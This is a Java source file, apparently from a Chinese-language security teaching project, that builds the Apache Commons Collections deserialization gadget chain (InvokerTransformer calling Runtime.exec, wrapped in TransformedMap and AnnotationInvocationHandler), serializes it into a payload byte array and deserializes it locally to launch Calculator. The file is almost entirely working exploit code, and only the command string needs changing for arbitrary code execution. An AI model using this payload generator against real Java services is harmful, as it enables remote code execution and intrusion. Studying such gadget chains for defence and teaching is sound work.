package com.anbai.sec.serializes;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

/**
 * Creator: yz
 * Date: 2019/12/16
 */
public class CommonsCollectionsTest {

	public static void main(String[] args) {
		String cmd = "open -a Calculator.app";

		Transformer[] transformers = new Transformer[]{
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[]{
						String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}
				),
				new InvokerTransformer("invoke", new Class[]{
						Object.class, Object[].class}, new Object[]{null, new Object[0]}
				),
				new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{cmd})
		};

		// 创建ChainedTransformer调用链对象
		Transformer transformedChain = new ChainedTransformer(transformers);

		// 创建Map对象
		Map map = new HashMap();

		// map的key名称必须对应创建AnnotationInvocationHandler时使用的注解方法名，比如创建
		// AnnotationInvocationHandler时传入的注解是java.lang.annotation.Target，那么map
		// 的key必须是@Target注解中的方法名，即：value，否则在反序列化AnnotationInvocationHandler
		// 类调用其自身实现的readObject方法时无法通过if判断也就无法通过调用到setValue方法了。
		map.put("value", "value");

		// 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
		Map transformedMap = TransformedMap.decorate(map, null, transformedChain);

//		// 遍历Map元素，并调用setValue方法
//		for (Object obj : transformedMap.entrySet()) {
//			Map.Entry entry = (Map.Entry) obj;
//
//			// setValue最终调用到InvokerTransformer的transform方法,从而触发Runtime命令执行调用链
//			entry.setValue("test");
//		}
//
//		transformedMap.put("v1", "v2");// 执行put也会触发transform

		try {
			// 获取AnnotationInvocationHandler类对象
			Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

			// 获取AnnotationInvocationHandler类的构造方法
			Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);

			// 设置构造方法的访问权限
			constructor.setAccessible(true);

			// 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：
			// Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
			Object instance = constructor.newInstance(Target.class, transformedMap);

			// 创建用于存储payload的二进制输出流对象
			ByteArrayOutputStream baos = new ByteArrayOutputStream();

			// 创建Java对象序列化输出流对象
			ObjectOutputStream out = new ObjectOutputStream(baos);

			// 序列化AnnotationInvocationHandler类
			out.writeObject(instance);
			out.flush();
			out.close();

			// 获取序列化的二进制数组
			byte[] bytes = baos.toByteArray();

			// 输出序列化的二进制数组
			System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));

			// 利用AnnotationInvocationHandler类生成的二进制数组创建二进制输入流对象用于反序列化操作
			ByteArrayInputStream bais = new ByteArrayInputStream(bytes);

			// 通过反序列化输入流(bais),创建Java对象输入流(ObjectInputStream)对象
			ObjectInputStream in = new ObjectInputStream(bais);

			// 模拟远程的反序列化过程
			in.readObject();

			// 关闭ObjectInputStream输入流
			in.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
